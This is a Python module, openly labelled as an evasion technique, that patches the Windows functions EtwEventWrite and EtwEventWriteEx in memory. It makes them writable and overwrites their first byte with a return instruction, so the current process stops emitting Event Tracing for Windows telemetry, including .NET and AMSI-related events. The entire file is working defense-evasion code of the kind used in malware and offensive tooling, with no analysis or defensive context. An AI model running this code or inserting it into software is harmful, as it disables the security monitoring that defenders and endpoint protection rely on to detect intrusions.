#!/usr/bin/env python3
"""Evasion: ETW patching — suppress Event Tracing for Windows telemetry."""
import ctypes
import platform

def patch():
    """Patch EtwEventWrite to immediately return (ret instruction).
    
    This suppresses ETW-based telemetry for the current process,
    including telemetry from .NET, AMSI, and other instrumented components.
    
    The patch overwrites the first byte of EtwEventWrite with 0xC3 (ret),
    causing it to return immediately without logging any events.
    """
    if platform.system() != "Windows":
        return False

    try:
        from ctypes import wintypes
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

        # Get ntdll module handle
        h_ntdll = k32.GetModuleHandleW("ntdll.dll")
        if not h_ntdll:
            return False

        # Find EtwEventWrite
        etw_write = k32.GetProcAddress(h_ntdll, b"EtwEventWrite")
        if not etw_write:
            return False

        # Patch with ret (0xC3)
        patch_byte = b"\xC3"

        old_prot = wintypes.DWORD(0)
        if not k32.VirtualProtect(etw_write, len(patch_byte),
                                  0x40,  # PAGE_EXECUTE_READWRITE
                                  ctypes.byref(old_prot)):
            return False

        ctypes.memmove(etw_write, patch_byte, len(patch_byte))

        k32.VirtualProtect(etw_write, len(patch_byte),
                          old_prot.value, ctypes.byref(old_prot))

        # Also patch EtwEventWriteEx if present
        etw_write_ex = k32.GetProcAddress(h_ntdll, b"EtwEventWriteEx")
        if etw_write_ex:
            old_prot2 = wintypes.DWORD(0)
            k32.VirtualProtect(etw_write_ex, len(patch_byte), 0x40,
                              ctypes.byref(old_prot2))
            ctypes.memmove(etw_write_ex, patch_byte, len(patch_byte))
            k32.VirtualProtect(etw_write_ex, len(patch_byte),
                              old_prot2.value, ctypes.byref(old_prot2))

        return True

    except Exception:
        return False
